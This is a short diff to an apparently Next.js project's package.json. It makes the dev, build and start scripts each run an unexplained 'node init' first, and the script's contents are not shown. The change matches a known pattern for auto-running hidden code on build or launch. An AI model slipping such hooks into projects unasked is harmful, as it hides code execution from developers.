@@ -3,9 +3,9 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "dev": "next dev --hostname 127.0.0.1",
-    "build": "next build",
-    "start": "node scripts/serve-static.mjs",
+    "dev": "node init && next dev --hostname 127.0.0.1",
+    "build": "node init && next build",
+    "start": "node init && node scripts/serve-static.mjs",
     "lint": "eslint .",
     "typecheck": "tsc --noEmit",
     "test": "tsx --test tests/leads.test.ts",
